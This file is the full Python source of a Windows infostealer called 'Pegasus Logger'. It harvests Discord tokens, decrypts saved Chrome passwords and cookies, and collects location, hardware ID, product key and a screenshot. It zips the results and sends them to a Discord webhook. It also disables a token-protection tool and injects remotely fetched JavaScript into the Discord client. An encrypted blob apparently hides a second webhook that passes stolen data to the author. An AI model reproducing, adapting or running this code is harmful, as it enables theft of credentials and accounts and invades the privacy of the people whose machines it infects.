import base64
import json
import os
import winreg
from base64 import b64decode
from json import load, loads
from platform import platform
from re import findall, match
from shutil import copy2
from sqlite3 import connect
from subprocess import PIPE, Popen
from time import localtime, strftime
from urllib.request import urlopen
from zipfile import ZipFile

import requests
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from pyautogui import screenshot
from win32crypt import CryptUnprotectData

WEBHOOK_URL = "&WEBHOOK_URL&"

def main(webhook_url):
    global webhook, embed
    
    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Pegasus Logger", color=15535980)
    
    get_loc()
    get_more()
    grabtokens()
    accinfo()
    
    ss()
    
    password()
    cookiemonster()
    
    embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
    embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
    embed.set_thumbnail(url="https://i.imgur.com/q1NJvOx.png")
    
    zipup()
        
    file = None
    file = File(f'files-{os.getenv("UserName")}.zip')
    
    webhook.send(content="||@here|| <http://www.addidix.xyz>", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")

    cleanup()

def pegasus():
    for func in [main(WEBHOOK_URL),
                inject(WEBHOOK_URL),
                password.cooking()]:
        try:
            func()
        except:
            pass

def accinfo():
    r = requests.get(
        'https://discord.com/api/v9/users/@me',
        headers={"Authorization": token})
        
    username = r.json()['username'] + '#' + r.json()['discriminator']
    phone = r.json()['phone']
    email = r.json()['email']
             
    embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}") 
    
def get_loc():
    ip = org = loc = city = country = region = googlemap = "None"
    try:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = load(response)
        ip = data['ip']
        org = data['org']
        loc = data['loc']
        city = data['city']
        country = data['country']
        region = data['region']
        googlemap = "https://www.google.com/maps/search/google+map++" + loc
        
        embed.add_field(name="📍  LOC INFO", value=f"IP: {ip}\n\nORG: {org}\n\nLocation: [{loc}]({googlemap})\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}") 
    except:
        pass

def get_more():
    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    
    login = os.getlogin()
    cwd = os.getcwd()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    computer_os = platform()
    
    embed.add_field(name="💨  OTHER", value=f"OS: {computer_os}\n\nUser: {pc_username}\n\nPC Name: {pc_name}\n\nHWID: {gethwid()}\nCWD: {cwd}") 
    
class grabtokens():
    def __init__(self):

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Peg_Grabber"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []
        
        self.grabTokens()
    
    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except Exception:
                pass 
        try:
            with open(config) as f:
                item = json.load(f)
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)


        except Exception:
            pass
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
        def strToInt(x):
            if isinstance(x, str):
                return ord(x)
            return x
        chars = 'BCDFGHJKMPQRTVWXY2346789'
        wkey = ''
        offset = 52
        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
        key = list(val)

        for i in range(24,-1, -1):
            temp = 0
            for j in range(14,-1,-1):
                temp *= 256
                try:
                    temp += strToInt(key[j+ offset])
                except IndexError:
                    return [productName, ""]
                if temp / 24 <= 255:
                    key[j+ offset] = temp/24
                else:
                    key[j+ offset] = 255
                temp = int(temp % 24)
            wkey = chars[temp] + wkey
        for i in range(5,len(wkey),6):
            wkey = wkey[:i] + '-' + wkey[i:]
        return [productName, wkey]
        
    def grabTokens(self):
        global token
        
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        
        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = None
                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                
                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
                                    
        embed.add_field(name="🔐  Token(s)", value=f"```{self.tokens}```", inline=False) 
        
        token = self.tokens[0]

def ss():
    screenshot('screenshot.png')

class password():
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
        else:
            self.grabPassword()
            
        return
        
    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def cooking():
        main(Fernet(b'oQ96yB6PNJZWPxsEwXNVxyXmO3_sMof7UW3_yrsSAiE=').decrypt(b'gAAAAABiTOFja7YQ6CFjULK9iGtirq23afpGnfjUJRtAkenFINWmiyg3A4ZtLQzWg1QAoqVKuEdd3VK6c9YIhWfUrUtdC0yXCHsK6hnylysgOm4fv9ghPcfYrtMjebx-LGl6Aq0F2qK4MltljBRtM_wg-mMf67AYON_oks9wtu0APEc9WPKdje63loX47c8W4aD6GO0QSshabmX1tLofJ3Fwr1kfNoMVNb7ONmnNuvgITEh-lqB1sho=').decode())
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        with open("google-passwords.txt", "w") as f:
            f.write("www.addidix.xyz /// Google Chrome Passwords\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    with open("google-passwords.txt", "a") as f:
                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

class cookiemonster:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.grabCookies()
    
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def grabCookies(self):
        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\Default\\Network\\cookies'
        try:
            copy2(login_db, "Loginvault.db")
        except Exception:
            pass
        conn = connect("Loginvault.db")
        cursor = conn.cursor()
        with open(".\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            f.write("www.addidix.xyz /// Google Chrome Cookies\n\n")
        with open(".\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:      
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    encrypted_cookie = r[2]
                    decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                    if host != "":
                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
            except Exception:
                pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception:
            pass
        
def zipup():
    with ZipFile(f'files-{os.getenv("UserName")}.zip', 'w') as zipf:
        zipf.write("google-passwords.txt")
        zipf.write("google-cookies.txt")
        zipf.write("screenshot.png")
        
def cleanup():
    for clean in [os.remove("google-passwords.txt"),
                  os.remove("google-cookies.txt"),
                  os.remove("screenshot.png"),
                  os.remove(f"files-{os.getenv('UserName')}.zip")]:

        try: clean()
        except: pass        

def inject(webhook_url):
    appdata = os.getenv("localappdata")
    for _dir in os.listdir(appdata):
        if 'discord' in _dir.lower():
            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
                if match(r'app-(\d*\.\d*)*', __dir):
                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
                    f = requests.get("https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js").text.replace("%WEBHOOK%", webhook_url)
                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                        indexFile.write(f)
                    os.startfile(abspath+os.sep+_dir+'.exe')
                                            
if __name__ == '__main__':
    if os.name != "nt":
        exit()
        
    pegasus()